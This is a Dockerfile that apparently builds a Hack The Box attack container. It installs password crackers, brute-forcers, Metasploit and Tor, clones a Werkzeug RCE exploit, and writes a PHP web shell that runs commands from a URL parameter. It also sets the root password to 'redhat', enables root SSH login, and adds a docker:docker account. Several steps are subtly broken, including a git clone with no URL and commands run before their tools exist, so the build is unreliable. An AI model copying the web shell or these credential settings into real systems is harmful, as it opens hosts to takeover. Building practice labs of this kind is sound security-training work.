from debian:latest
RUN apt update -y && apt upgrade -y
RUN curl -L -o /gits/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

RUN apt install -y openvpn nano git lynis
RUN apt install -y net-tools mc etckeeper iptraf net-tools tcpdump fail2ban
RUN apt install -y iputils-ping
RUN apt install -y nano vim nmap curl wget telnet ftp lftp ncftp
RUN apt install ufw  procps -y
RUN ssh-keygen -t ed25519 -a 100 -f /root/.ssh/id_ed25519 -q -N ''
RUN useradd docker && echo "docker:docker" | chpasswd
RUN mkdir -p /home/docker && chown -R docker:docker /home/docker
RUN echo 'root:`cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 20 | head -n 5`' | chpasswd

ADD openvpn/unpriv-ip /usr/local/sbin/unpriv-ip
RUN alias 
#HTB part, later mount -v 
RUN echo 'alias ss="/scripts/starting.sh"' >> ~/.bashrc
RUN echo 'alias mm="/scripts/machines.sh"' >> ~/.bashrc
RUN echo 'alias cc="/scripts/competitive.sh"' >> ~/.bashrc

RUN apt install jq clamav rkhunter -y
RUN apt install smbclient -y
RUN apt install redis-tools -y
RUN apt install gobuster git -y
RUN apt install squid -y
ADD squid.conf /etc/squid/squid.conf
RUN apt install -y git tmux build-essential 
RUN apt install -y zlib1g zlib1g-dev
RUN apt install -y libxml2 libxml2-dev libxslt-dev locate
RUN apt install -y libreadline6-dev libcurl4-openssl-dev git-core
RUN apt install -y libssl-dev libyaml-dev openssl autoconf libtool
RUN apt install -y ncurses-dev bison curl wget xsel postgresql
RUN apt install -y postgresql-contrib postgresql-client libpq-dev
RUN apt install -y libapr1 libaprutil1 libsvn1
RUN apt install -y libpcap-dev libsqlite3-dev libgmp3-dev
RUN apt install -y tor torsocks nasm vim nmap ntpdate
RUN apt install -y hydra hashcat hashcat-data 
ADD id_ed25519.pub .
RUN cat id_ed25519.pub >/root/.ssh/authorized_keys
RUN apt install -y openssh-server
RUN mkdir /var/run/sshd
RUN echo 'root:redhat' | chpasswd
#password for user login
RUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
RUN apt install mysql* -y
RUN python3 get-pip.py
RUN apt install -y python3-dev
RUN pip install netifaces
RUN apt install -y john
RUN apt install evil-winrm -y
RUN apt install awscli -y

RUN mkdir -p /tools/shell/php
RUN echo '<?php system($_GET["cmd"]); ?>' > /tools/shell/php/shell.php

RUN apt install python3 python3-pip -y
RUN cd /gits/impacket && pip3 install -r requirements.txt && python3 setup.py install 

#python2 support
RUN apt install python2 -y
RUN rm -rf get-pip.py && wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
RUN python2 get-pip.py
RUN pip3 install requests
RUN pip2.7 install requests
RUN cd /gits && git clone  && cd Werkzeug-Debug-RCE && chmod +x werkzeug.py
RUN cd /gits && git clone https://github.com/rapid7/metasploit-framework.git
RUN curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall &&  chmod 755 msfinstall &&  ./msfinstall
RUN apt install -y git tmux build-essential zlib1g zlib1g-dev libxml2 libxml2-dev libxslt-dev locate libreadline6-dev libcurl4-openssl-dev git-core  libssl-dev libyaml-dev openssl autoconf libtool ncurses-dev bison curl wget xsel postgresql postgresql-contrib postgresql-client libpq-dev libapr1 libaprutil1 libsvn1 libpcap-dev libsqlite3-dev libgmp3-dev tor torsocks nasm vim nmap ntpdate emacs hydra hashcat hashcat-data
ADD scripts scripts
RUN chmod +x scripts/*.sh

CMD (apt update |true) && apt upgrade -y && curl -s ipinfo.io |jq -r '.country' && /usr/sbin/sshd  && squid && /bin/bash
EXPOSE 3128 22
#USER root
#ENTRYPOINT 'ufw enable'
